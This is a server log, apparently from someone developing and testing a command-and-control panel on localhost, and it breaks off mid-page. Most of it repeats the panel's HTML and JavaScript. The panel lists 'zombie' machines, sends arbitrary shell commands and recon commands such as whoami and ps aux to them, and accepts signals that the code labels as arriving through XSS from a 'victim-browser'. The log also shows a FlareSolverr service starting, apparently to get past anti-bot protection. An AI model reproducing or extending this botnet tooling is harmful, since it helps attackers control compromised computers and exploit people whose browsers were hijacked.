2025-06-24 23:12:37 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 23:12:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:12:38 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:12:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0312s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:12:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:38] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:12:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:38] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:12:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:12:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:12:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:41] "[33mGET /add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 404 -
2025-06-24 23:12:41 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:12:41 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: victim-browser,消息: XSS_GET_signal,時間: 2025-06-24 23:12:41.986649
2025-06-24 23:12:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0071s) -> 回傳: (<Response 216 bytes [200 OK]>, 200)
2025-06-24 23:12:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:41] "GET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1" 200 -
2025-06-24 23:12:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:12:43 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:12:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:12:41.980347</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:12:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:43] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:12:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:43] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:12:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:43] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:13:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 23:13:07 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 23:13:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 81 bytes [200 OK]>
2025-06-24 23:13:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:13:07] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 23:13:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 23:13:08 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 23:13:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 81 bytes [200 OK]>
2025-06-24 23:13:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:13:08] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 23:16:40 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:16:40 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:16:40 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:16:40 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:16:40 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:16:40 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:16:40 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:16:40 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:16:40 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 23:16:44 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 23:16:44 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 23:16:44 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:16:44 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:16:44 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:16:44 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:16:44 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:16:44 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:16:44 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:16:44 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:16:44 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:16:44 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:16:44 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:16:44 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:16:44 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:16:44 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 23:16:44 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 23:16:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:16:45 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:16:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:45] "[33mGET /add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 404 -
2025-06-24 23:16:45 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: victim-browser,消息: XSS_GET_signal,時間: 2025-06-24 23:16:45.366661
2025-06-24 23:16:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0282s) -> 回傳: (<Response 216 bytes [200 OK]>, 200)
2025-06-24 23:16:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:45] "GET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1" 200 -
2025-06-24 23:16:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:16:48 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:16:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0082s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    